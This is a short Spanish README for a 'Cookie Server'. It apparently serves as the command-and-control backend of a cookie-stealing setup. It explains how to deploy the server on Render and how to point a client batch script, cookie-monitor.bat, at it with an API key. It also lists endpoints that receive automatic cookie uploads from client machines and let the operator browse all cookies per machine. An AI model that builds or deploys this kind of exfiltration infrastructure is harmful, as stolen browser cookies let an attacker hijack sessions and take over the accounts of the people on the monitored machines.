# Cookie Server

Panel centralizado de cookies. Recibe uploads automáticos desde máquinas cliente.

## Deploy en Render (gratis)

1. Subí esta carpeta `cookie-server/` a un repo en GitHub
2. Andá a [render.com](https://render.com) → New → Web Service
3. Conectá el repo
4. Settings:
   - **Build Command:** `npm install`
   - **Start Command:** `node server.js`
   - **Environment Variables:** agregá `API_KEY` con un valor secreto
5. Deploy

Tu URL va a ser algo como `https://cookie-server-xxxx.onrender.com`

## Configurar el cliente

En `cookie-monitor.bat`, reemplazá:
```
set COOKIE_SERVER_URL=https://cookie-server-xxxx.onrender.com
set COOKIE_API_KEY=tu_api_key_aqui
```

## API

- `POST /api/upload` — sube cookies (requiere header `X-API-Key`)
- `GET /api/machines` — lista máquinas
- `GET /api/cookies` — todas las cookies
- `GET /api/cookies/:machineId` — cookies de una máquina
- `GET /` — panel web
